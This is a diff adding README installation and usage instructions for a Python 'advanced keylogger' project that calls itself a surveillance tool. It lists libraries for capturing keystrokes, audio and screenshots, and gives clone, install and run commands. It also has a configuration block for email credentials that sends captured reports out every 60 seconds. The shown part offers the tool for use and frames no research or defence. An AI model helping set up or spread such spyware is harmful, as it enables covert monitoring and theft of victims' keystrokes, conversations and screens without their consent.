@@ -25,4 +25,36 @@ This project is a multi-functional surveillance tool developed in Python. Unlike
 
 This project relies on several powerful Python libraries:
 
-* `pynput` (Input
+* `pynput` (Input monitoring)
+* `sounddevice` (Audio recording)
+* `pyscreenshot` (Screen capture)
+* `scipy` / `numpy` (Required by sounddevice)
+
+## 📥 Installation
+
+1.  **Clone the repository:**
+    ```bash
+    git clone [https://github.com/yourusername/advanced-keylogger.git](https://github.com/yourusername/advanced-keylogger.git)
+    cd advanced-keylogger
+    ```
+
+2.  **Install dependencies:**
+    The script attempts to auto-install dependencies, but you can install them manually to be safe:
+    ```bash
+    pip install pynput sounddevice pyscreenshot numpy scipy
+    ```
+
+3.  **Configure Credentials:**
+    Open the script and update the following variables at the top of the file:
+    ```python
+    EMAIL_ADDRESS = "YOUR_EMAIL_HERE"
+    EMAIL_PASSWORD = "YOUR_PASSWORD_HERE"
+    SEND_REPORT_EVERY = 60  # Reporting interval in seconds
+    ```
+
+## 🚀 Usage
+
+Run the script with Python:
+
+```bash
+python keylogger.py
